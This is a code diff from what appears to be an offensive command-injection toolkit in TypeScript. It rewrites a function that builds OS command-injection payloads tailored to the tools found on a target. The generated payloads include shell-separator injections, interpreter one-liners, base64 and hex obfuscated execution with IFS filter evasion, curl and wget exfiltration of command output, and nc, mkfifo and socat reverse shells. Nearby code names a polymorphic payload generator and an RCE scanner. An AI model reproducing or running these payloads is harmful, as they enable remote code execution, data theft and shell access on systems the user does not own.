@@ -2168,7 +2168,152 @@ export function buildContextPayloads(
 
   /** Build payloads adapted to the available tools detected on the target.
    *  Pass the list from targetProbe.ts probeAvailableTools().
+   *  Only emits payload variants that use binaries confirmed present,
+   *  dramatically reducing noise and maximising per-request hit rate.
    */
+  export function buildAdaptivePayloads(cmd: string, tools: string[]): string[] {
+    const t    = new Set(tools.map(x => x.trim().toLowerCase()));
+    const has  = (name: string): boolean => t.has(name);
+    const set: string[] = [];
+    const q  = cmd.replace(/'/g, "\\'");
+    const qd = cmd.replace(/"/g, '\\"');
+
+    /* ── Shell execution primitives ── */
+    if (has("bash")) {
+      set.push(
+        `;${cmd}`,
+        `&&${cmd}`,
+        `|${cmd}`,
+        `;bash -c '${q}'`,
+        `;bash<<<'${q}'`,
+        `\`${cmd}\``,
+        `$(${cmd})`,
+      );
+    } else if (has("sh")) {
+      set.push(`;${cmd}`, `&&${cmd}`, `|${cmd}`, `;sh -c '${q}'`);
+    } else if (has("zsh")) {
+      set.push(`;zsh -c '${q}'`);
+    } else if (has("fish")) {
+      set.push(`;fish -c '${q}'`);
+    }
+
+    /* ── High-level interpreters ── */
+    if (has("python3")) {
+      set.push(`;python3 -c "__import__('os').system('${q}')"`,
+               `;python3 -c "import subprocess;subprocess.run(['sh','-c','${q}'])"`);
+    } else if (has("python")) {
+      set.push(`;python -c "__import__('os').system('${q}')"`,
+               `;python -c "import subprocess;subprocess.call(['sh','-c','${q}'])"`);
+    }
+    if (has("perl")) {
+      set.push(`;perl -e "system('${q}')"`,
+               `;perl -e "use POSIX;system('${q}')"`);
+    }
+    if (has("ruby")) {
+      set.push(`;ruby -e "system('${q}')"`,
+               `;\`${cmd}\``);
+    }
+    if (has("php")) {
+      set.push(`;php -r "system('${q}');"`,
+               `;php -r "passthru('${q}');"`);
+    }
+    if (has("node") || has("nodejs")) {
+      set.push(`;node -e "require('child_process').execSync('${q}',{stdio:'inherit'})"`,
+               `;node -e "require('child_process').execFileSync('/bin/sh',['-c','${q}'],{stdio:'pipe'}).toString()"`);
+    }
+    if (has("lua")) {
+      set.push(`;lua -e "os.execute('${q}')"`,
+               `;lua5.3 -e "os.execute('${q}')"`);
+    }
+    if (has("tclsh")) {
+      set.push(`;tclsh <<'__TCL__'\nexec ${cmd}\n__TCL__`);
+    }
+    if (has("awk")) {
+      set.push(`;awk 'BEGIN{system("${qd}")}'`);
+    }
+
+    /* ── Encoding-based execution (needs base64 + a shell) ── */
+    if (has("base64") && (has("bash") || has("sh"))) {
+      const b  = Buffer.from(cmd).toString("base64");
+      const sh = has("bash") ? "bash" : "sh";
+      set.push(
+        `;${sh}<<<$(echo${IFS}${b}|base64${IFS}-d)`,
+        `;echo${IFS}${b}|base64${IFS}-d|${sh}`,
+        `;{echo,${b}}|{base64,-d}|${sh}`,
+      );
+    }
+    if (has("openssl") && (has("bash") || has("sh"))) {
+      const b  = Buffer.from(cmd).toString("base64");
+      const sh = has("bash") ? "bash" : "sh";
+      set.push(`;echo${IFS}${b}|openssl${IFS}enc${IFS}-d${IFS}-base64|${sh}`);
+    }
+    if (has("xxd") && (has("bash") || has("sh"))) {
+      const rhx = Buffer.from(cmd).toString("hex");
+      const sh  = has("bash") ? "bash" : "sh";
+      set.push(`;echo${IFS}${rhx}|xxd${IFS}-r${IFS}-p|${sh}`);
+    }
+
+    /* ── Exfil / OOB channels ── */
+    if (has("curl")) {
+      set.push(
+        `;curl -sk "http://$(${cmd}|base64 -w0).leak/" 2>/dev/null`,
+        `;_R=$(${cmd}${IFS}2>&1);curl -sk "http://localhost/?x=$(printf '%s' "$_R"|base64 -w0|head -c200)" 2>/dev/null`,
+      );
+    }
+    if (has("wget")) {
+      set.push(
+        `;wget -qO- "http://localhost/?x=$(${cmd}|base64 -w0)" 2>/dev/null`,
+        `;_R=$(${cmd}${IFS}2>&1);wget -qO/dev/null "http://localhost/?d=$(printf '%s' "$_R"|base64 -w0|head -c200)" 2>/dev/null`,
+      );
+    }
+
+    /* ── Reverse-shell shortcuts (needs nc/ncat/socat on target) ── */
+    if (has("ncat")) {
+      set.push(`;ncat -e /bin/sh localhost 4444 2>/dev/null &`);
+    } else if (has("nc") || has("netcat")) {
+      set.push(
+        `;nc -e /bin/sh localhost 4444 2>/dev/null &`,
+        `;rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc localhost 4444>/tmp/f 2>/dev/null &`,
+      );
+    }
+    if (has("socat")) {
+      set.push(`;socat exec:'/bin/sh -i',pty,stderr tcp:localhost:4444 2>/dev/null &`);
+    }
+
+    /* ── printf hex eval (always available if printf exists) ── */
+    if (has("printf")) {
+      const hex = [...Buffer.from(cmd)].map((b: number) => `\\x${b.toString(16).padStart(2,"0")}`).join("");
+      const sh  = has("bash") ? "bash" : has("sh") ? "sh" : null;
+      if (sh) set.push(`;$(printf${IFS}'${hex}')`);
+    }
+
+    /* ── GNU coreutils execution vectors ── */
+    if (has("sed")) {
+      set.push(`;sed -n 'e ${cmd}' /dev/null 2>/dev/null`);
+    }
+    if (has("find")) {
+      const parts = cmd.split(" ");
+      set.push(`;find /tmp -maxdepth 0 -exec ${parts[0]} ${parts.slice(1).join(" ")} \\; 2>/dev/null`);
+    }
+    if (has("xargs") && (has("bash") || has("sh"))) {
+      set.push(`;echo ${JSON.stringify(cmd)} | xargs -I% sh -c "%" 2>/dev/null`);
+    }
+    if (has("tee") && (has("bash") || has("sh"))) {
+      set.push(`;echo ${JSON.stringify(cmd)} | tee /dev/stderr | sh 2>/dev/null`);
+    }
+    if (has("dd") && (has("bash") || has("sh"))) {
+      set.push(`;dd if=/dev/stdin of=/tmp/.nx bs=1 count=${cmd.length} <<< ${JSON.stringify(cmd)} 2>/dev/null && sh /tmp/.nx; rm -f /tmp/.nx`);
+    }
+
+    /* ── Universal fallbacks (no tool check needed) ── */
+    set.push(`;${cmd}`, `\n${cmd}`, `${IFS}${cmd}`, `||${cmd}`, `&&${cmd}`);
+    /* Always add base64-encoded eval as last-resort (no tool dependency on fallback) */
+    set.push(`eval "$(printf '${hexEsc(cmd)}')" 2>/dev/null`);
+    set.push(`{ ${cmd}; } 2>&1`);
+    set.push(`( ${cmd} ) 2>&1`);
+
+    return [...new Set(set)].filter(p => p.trim().length > 1);
+  }
 
 /* ═══════════════════════════════════════════════════════════════════════════
    POLYMORPHIC PAYLOAD GENERATOR
@@ -2902,84 +3047,6 @@ export function buildDirectInjectionPayloads(cmd: string): string[] {
   ].filter((v,i,a)=>a.indexOf(v)===i); // deduplicate
 }
 
-/* ── Adaptive payloads (context-aware) - MASSIVELY EXPANDED ─────────────── */
-export function buildAdaptivePayloads(cmd: string, tools: string[]): string[] {
-  const B64 = b64(cmd);
-  const has  = (t: string) => tools.includes(t);
-  const out: string[] = [];
-
-  /* Always include base variants */
-  out.push(`{ ${cmd}; } 2>&1`);
-  out.push(`( ${cmd} ) 2>&1`);
-  out.push(`eval ${JSON.stringify(cmd)}`);
-  out.push(`bash -c ${JSON.stringify(cmd)}`);
-  out.push(`sh -c ${JSON.stringify(cmd)}`);
-
-  if (has("bash") || has("sh")) {
-    out.push(`{echo,${B64}}|{base64,-d}|{bash,}`);
-    out.push(`bash<<<$(echo ${B64}|base64 -d)`);
-    out.push(`bash -c "$(printf '${hexEsc(cmd)}')" 2>/dev/null`);
-    out.push(`exec 3<>/dev/tcp/127.0.0.1/0; ${cmd} >&3`);
-  }
-  if (has("python3") || has("python")) {
-    out.push(`python3 -c "import os;os.system(${JSON.stringify(cmd)})" 2>/dev/null`);
-    out.push(`python3 -c "import base64,os;os.system(base64.b64decode('${B64}').decode())" 2>/dev/null`);
-    out.push(`python3 -c "import subprocess;print(subprocess.check_output(['sh','-c',${JSON.stringify(cmd)}]).decode())" 2>/dev/null`);
-  }
-  if (has("perl")) {
-    out.push(`perl -e "system(${JSON.stringify(cmd)})" 2>/dev/null`);
-    out.push(`perl -MMIME::Base64 -e "system(decode_base64('${B64}'))" 2>/dev/null`);
-  }
-  if (has("ruby")) {
-    out.push(`ruby -e "system(${JSON.stringify(cmd)})" 2>/dev/null`);
-    out.push(`ruby -e "require 'base64';system(Base64.decode64('${B64}'))" 2>/dev/null`);
-  }
-  if (has("node")) {
-    out.push(`node -e "require('child_process').execSync(${JSON.stringify(cmd)},{stdio:'inherit'})" 2>/dev/null`);
-    out.push(`node -e "require('child_process').execSync(Buffer.from('${B64}','base64').toString(),{stdio:'inherit'})" 2>/dev/null`);
-  }
-  if (has("curl")) {
-    out.push(`curl -sk "http://127.0.0.1/$(${cmd})" 2>/dev/null`);
-    out.push(`curl -sk -d "$(${cmd})" "http://127.0.0.1/" 2>/dev/null`);
-  }
-  if (has("nc") || has("ncat")) {
-    out.push(`echo "${cmd}" | nc -q1 127.0.0.1 9999 2>/dev/null`);
-  }
-  if (has("php")) {
-    out.push(`php -r "system(${JSON.stringify(cmd)});" 2>/dev/null`);
-    out.push(`php -r "passthru(${JSON.stringify(cmd)});" 2>/dev/null`);
-  }
-  if (has("awk")) {
-    out.push(`awk 'BEGIN{system(${JSON.stringify(cmd)})}' /dev/null 2>/dev/null`);
-  }
-  if (has("sed")) {
-    out.push(`sed -n 'e ${cmd}' /dev/null 2>/dev/null`);
-  }
-  if (has("find")) {
-    out.push(`find /tmp -maxdepth 0 -exec ${cmd.split(' ')[0]} ${cmd.split(' ').slice(1).join(' ')} \\; 2>/dev/null`);
-  }
-  if (has("xargs")) {
-    out.push(`echo ${JSON.stringify(cmd)} | xargs -I% bash -c "%" 2>/dev/null`);
-  }
-  if (has("tee")) {
-    out.push(`echo ${JSON.stringify(cmd)} | tee /dev/stderr | bash 2>/dev/null`);
-  }
-  if (has("dd")) {
-    out.push(`dd if=/dev/stdin of=/tmp/.nx bs=1 count=${cmd.length} <<< ${JSON.stringify(cmd)} && bash /tmp/.nx 2>/dev/null`);
-  }
-  if (has("openssl")) {
-    out.push(`echo ${B64}|openssl enc -d -base64|bash 2>/dev/null`);
-  }
-  if (has("base64")) {
-    out.push(`echo ${B64}|base64 -d|bash 2>/dev/null`);
-    out.push(`echo ${b64(B64)}|base64 -d|base64 -d|bash 2>/dev/null`);
-  }
-  if (has("xxd")) {
-    out.push(`echo ${Buffer.from(cmd).toString('hex')}|xxd -r -p|bash 2>/dev/null`);
-  }
-
-  return out;
-}
 
 /* ── Injection-ready self-contained RCE scanner ─────────────────────────── */
 export function buildScanningPayloads(attackerIp: string, attackerPort: string): string[] {
